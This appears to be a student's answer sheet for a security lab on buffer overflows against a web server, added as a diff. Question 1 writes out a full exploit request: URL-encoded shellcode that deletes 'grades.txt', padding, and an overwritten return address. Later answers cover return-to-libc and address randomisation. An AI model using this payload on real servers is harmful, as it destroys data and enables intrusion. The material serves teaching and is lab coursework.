@@ -1,0 +1,30 @@
+Question 1:
+---------------------------------
+
+GET %EB%1B%5E%89v%0B1%C0%88F%0A%B8%0A%00%00%00%89%F3%CD%80%B8%01%00%00%001%DB%CD%80%E8%E0%FF%FF%FFgrades.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%DC%DC%FF%FF HTTP/1.0
+
+
+The first part comes from the shellcode.
+
+The second part comes from the code of the exploit-ex.py ""x" * (retaddr - reqpath - len(shellcode))", which is to fill the code with x's until the third part.
+
+The third part is the instruction to return to reqpath.
+
+
+Question 2:
+---------------------------------
+No it is not removed. The stack is not executable anymore in the web server. 
+
+
+Question 3:
+---------------------------------
+Return address: 'unlink' instruction
+P: 'address of fname[0]' which is grades.txt
+
+Question 4:
+---------------------------------
+The values of reqpath and ebp changes. 
+The difference between "ebp - reqpath" does not change.
+
+These changes make it harder as the code only injects at a fixed location while the address of the reqpath and ebp changes all the time.
+However if the code is able to pinpoint just the location of reqpath dynamically, then it will make no difference.
